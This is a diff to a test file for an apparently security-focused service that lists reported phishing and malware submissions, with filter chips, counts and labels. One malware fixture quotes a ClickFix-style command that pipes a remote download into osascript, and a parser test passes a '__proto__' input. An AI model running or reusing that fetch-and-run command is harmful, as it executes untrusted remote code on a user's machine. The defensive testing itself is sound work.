@@ -25,25 +25,40 @@ describe("submission list pages", () => {
 		const page = await listSubmissionCards();
 		expect(page).toEqual({
 			submissions: [
-				{ id: "3", kind: "email", status: "reported", createdAt: "2026-10-03T00:00:00.000Z", title: "list-3" },
-				{ id: "2", kind: "email", status: "reported", createdAt: "2026-10-02T00:00:00.000Z", title: "Your account is locked" },
+				{ id: "3", kind: "email", status: "reported", createdAt: "2026-10-03T00:00:00.000Z", title: "list-3", reportedAs: "phishing" },
+				{ id: "2", kind: "email", status: "reported", createdAt: "2026-10-02T00:00:00.000Z", title: "Your account is locked", reportedAs: "phishing" },
+				// A website reported before its verdicts were kept says only that it was reported.
 				{ id: "1", kind: "website", status: "reported", createdAt: "2026-10-01T00:00:00.000Z", title: "https://kit.example.com/login" },
 			],
-			counts: { running: 0, phishing: 3, not_phishing: 0, failed: 0 },
+			counts: { running: 0, reported: 3, no_threat: 0, failed: 0 },
 		});
 		// The reporter's IP and headers, and the full analysis data, are not part of the public list.
 		expect(JSON.stringify(page)).not.toContain("203.0.113.9");
 		expect(JSON.stringify(page)).not.toContain("whois");
 	});
 
-	test("a case reported only for the deceptive funnel its chain is says so; one with a phishing site of its own is phishing", async () => {
+	test("a reported case says what it was reported for, across every route: phishing, malware, both, or only the deceptive funnel its chain is", async () => {
 		const funnel = { verdict: { finding: "deceptive_funnel" }, extraction: {} } as never;
 		const hop = { hopIndex: 0, judgedHopIndex: 0 };
+		const phishing = { ...hop, finding: "phishing" as const, phishingBasis: "credential_theft" as const, evidenceQuote: "Sign in" };
+		const malware = { ...hop, finding: "malware" as const, evidenceQuote: "curl https://hostsync.pro/x | osascript" };
 		await create(11n, new Date("2026-10-01T00:00:00Z"), { kind: "website", website: { url: "https://lure.com/", routes: [{ hops: [], funnel, siteAssessments: [{ ...hop, finding: "insufficient_evidence" }] }] } });
-		await create(12n, new Date("2026-10-02T00:00:00Z"), { kind: "website", website: { url: "https://kit.com/", routes: [{ hops: [], funnel, siteAssessments: [{ ...hop, finding: "phishing", phishingBasis: "credential_theft", evidenceQuote: "Sign in" }] }] } });
+		await create(12n, new Date("2026-10-02T00:00:00Z"), { kind: "website", website: { url: "https://kit.com/", routes: [{ hops: [], funnel, siteAssessments: [phishing] }] } });
 		await create(13n, new Date("2026-10-03T00:00:00Z"), { kind: "website", website: { url: "https://shop.com/", routes: [{ hops: [], funnel: { verdict: { finding: "not_deceptive" }, extraction: {} } as never }] } }, "invalid");
+		// Production case 384401854580134038: a ClickFix clone is malware, not phishing.
+		await create(14n, new Date("2026-10-04T00:00:00Z"), { kind: "website", website: { url: "https://trylevo.app/", routes: [{ hops: [], siteAssessments: [{ ...hop, finding: "benign" }] }, { hops: [], siteAssessments: [malware] }] } });
+		await create(15n, new Date("2026-10-05T00:00:00Z"), { kind: "website", website: { url: "https://mixed.com/", routes: [{ hops: [], siteAssessments: [phishing] }, { hops: [], siteAssessments: [malware] }] } });
+		// A malware verdict of a case that is not reported (yet) labels nothing.
+		await create(16n, new Date("2026-10-06T00:00:00Z"), { kind: "website", website: { url: "https://running.com/", routes: [{ hops: [], siteAssessments: [malware] }] } }, "running");
 		const page = await listSubmissionCards();
-		expect(page.submissions.map(({ id, reportedAs }) => ({ id, reportedAs }))).toEqual([{ id: "13", reportedAs: undefined }, { id: "12", reportedAs: undefined }, { id: "11", reportedAs: "deceptive_funnel" }]);
+		expect(page.submissions.map(({ id, reportedAs }) => ({ id, reportedAs }))).toEqual([
+			{ id: "16", reportedAs: undefined },
+			{ id: "15", reportedAs: "phishing_and_malware" },
+			{ id: "14", reportedAs: "malware" },
+			{ id: "13", reportedAs: undefined },
+			{ id: "12", reportedAs: "phishing" },
+			{ id: "11", reportedAs: "deceptive_funnel" },
+		]);
 	});
 
 	test("pages through every submission exactly once, across equal timestamps and new arrivals", async () => {
@@ -84,20 +99,20 @@ describe("submission list pages", () => {
 		for (const [index, status] of statuses.entries()) {
 			await create(BigInt(300 + index), new Date(base + index), { kind: "website", website: { url: `https://s${index}.example.com/` } }, status);
 		}
-		const counts = { running: 1, phishing: 2, not_phishing: 3, failed: 2 };
+		const counts = { running: 1, reported: 2, no_threat: 3, failed: 2 };
 
 		// The default chips: what is being analyzed now and what was confirmed, newest first.
-		const first = await listSubmissionCards({ filters: ["running", "phishing"], limit: 2 });
+		const first = await listSubmissionCards({ filters: ["running", "reported"], limit: 2 });
 		expect(first.submissions.map(({ id, status }) => `${id}:${status}`)).toEqual(["306:reported", "301:reported"]);
 		expect(first.counts).toEqual(counts);
-		const second = await listSubmissionCards({ filters: ["running", "phishing"], limit: 2, cursor: first.nextCursor });
+		const second = await listSubmissionCards({ filters: ["running", "reported"], limit: 2, cursor: first.nextCursor });
 		expect(second.submissions.map(({ id }) => id)).toEqual(["300"]);
 		expect(second.nextCursor).toBeUndefined();
 		// Older pages carry no counts; the newest page's refresh keeps them current.
 		expect(second.counts).toBeUndefined();
 
 		expect((await listSubmissionCards({ filters: ["failed"] })).submissions.map(({ id }) => id)).toEqual(["305", "304"]);
-		expect((await listSubmissionCards({ filters: ["failed", "not_phishing"] })).submissions.map(({ id }) => id)).toEqual(["307", "305", "304", "303", "302"]);
+		expect((await listSubmissionCards({ filters: ["failed", "no_threat"] })).submissions.map(({ id }) => id)).toEqual(["307", "305", "304", "303", "302"]);
 		// No chip lists nothing, but still counts everything.
 		expect(await listSubmissionCards({ filters: [] })).toEqual({ submissions: [], counts });
 		// Without a filter, everything is listed.
@@ -109,12 +124,13 @@ describe("submission list pages", () => {
 		await create(401n, new Date("2026-11-01T00:00:01Z"), { kind: "website", website: { url: "https://b.example.com/" } }, "running");
 		const get = (query: string) => GET(new NextRequest(`https://phishing.support/api/submissions${query}`));
 
-		expect((await (await get("?status=running,phishing")).json()).submissions.map(({ id }: { id: string }) => id)).toEqual(["401"]);
+		expect((await (await get("?status=running,reported")).json()).submissions.map(({ id }: { id: string }) => id)).toEqual(["401"]);
 		expect((await (await get("?status=")).json()).submissions).toEqual([]);
 		expect((await (await get("")).json()).submissions).toHaveLength(2);
-		const refused = await get("?status=running,reported");
+		// The chips are named for what a case was found to be, which covers malware: "phishing" is no chip.
+		const refused = await get("?status=running,phishing");
 		expect(refused.status).toBe(400);
-		expect((await refused.json()).error).toBe('Unknown submission filter "reported"; use running, phishing, not_phishing, failed.');
+		expect((await refused.json()).error).toBe('Unknown submission filter "phishing"; use running, reported, no_threat, failed.');
 
 		expect(parseSubmissionFilters(" running , running,failed,")).toEqual(["running", "failed"]);
 		expect(() => parseSubmissionFilters("__proto__")).toThrow(SubmissionFilterError);
